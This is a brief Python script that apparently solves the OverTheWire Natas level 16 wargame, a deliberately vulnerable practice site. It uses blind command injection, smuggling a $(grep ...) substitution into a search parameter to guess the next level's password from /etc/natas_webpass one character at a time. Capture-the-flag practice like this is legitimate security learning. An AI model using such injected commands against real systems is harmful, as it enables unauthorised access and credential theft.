#!/usr/bin/env python

import httplib
import urllib
import base64

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
count = 0

headers = {}
username = ""
password = ""
conn = httplib.HTTPConnection("natas16.natas.labs.overthewire.org")
base64string = base64.encodestring('%s:%s' % (username, password)).replace('\n', '')
headers["Authorization"] = "Basic %s" % base64string

count = 0
passwd = ""
while count != 32:
    for i in charset:
        passwd += i
        needle = urllib.quote_plus("$(grep -E ^" + passwd + ".* /etc/natas_webpass/natas17)hackers")
        conn.request("GET", "/?needle=" + needle + "&submit=Search", "", headers)
        r1 = conn.getresponse()
        data = r1.read()
        if data.count("hackers") == 0:
            print "OK, Current passwd is ", passwd
            count += 1
            break
        else:
            passwd = passwd[:-1]
        conn.close()
print "Final passsword : ", passwd